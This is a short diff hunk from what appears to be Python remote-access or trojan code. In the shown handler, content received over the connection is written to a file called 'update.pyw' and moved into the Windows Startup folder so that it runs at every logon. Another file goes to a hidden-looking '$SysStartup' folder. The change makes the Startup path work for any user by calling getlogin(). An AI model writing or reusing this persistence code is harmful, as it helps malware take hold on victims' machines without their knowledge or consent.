@@ -98,7 +98,7 @@ def process(message):
         call(["move", "pslib.pyw", "C:\\$SysStartup"], shell=True)
         with open("update.pyw", "w") as file:
             file.write(var)
-        call('move test.txt "C:/Users/failo/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"', shell=True)
+        call(f'move update.pyw "C:/Users/{getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"', shell=True)
         recvMsg()
 
     else:
